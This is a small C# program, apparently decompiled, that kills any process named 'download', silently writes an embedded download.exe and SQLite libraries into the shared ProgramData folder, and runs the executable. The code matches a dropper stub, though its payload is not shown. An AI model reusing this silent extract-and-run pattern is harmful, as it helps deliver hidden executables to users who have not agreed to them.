using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;

namespace ExtractResource;

internal class Program
{
	public static string programDirectory = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

	private static void Main(string[] args)
	{
		Process[] processesByName = Process.GetProcessesByName("download");
		foreach (Process process in processesByName)
		{
			process.Kill();
		}
		Thread.Sleep(3000);
		Cikart("ExtractResource", programDirectory, "kot", "download.exe");
		Cikart("ExtractResource", programDirectory, "kot", "msvcr100.dll");
		Cikart("ExtractResource", programDirectory, "kot", "SQLite.Interop.dll");
		Cikart("ExtractResource", programDirectory, "kot", "System.Data.SQLite.dll");
		Process.Start(programDirectory + "\\download.exe");
	}

	private static void Cikart(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		using Stream stream = callingAssembly.GetManifestResourceStream(nameSpace + "." + ((internalFilePath == "") ? "" : (internalFilePath + ".")) + resourceName);
		using BinaryReader binaryReader = new BinaryReader(stream);
		using FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate);
		using BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.Write(binaryReader.ReadBytes((int)stream.Length));
	}
}
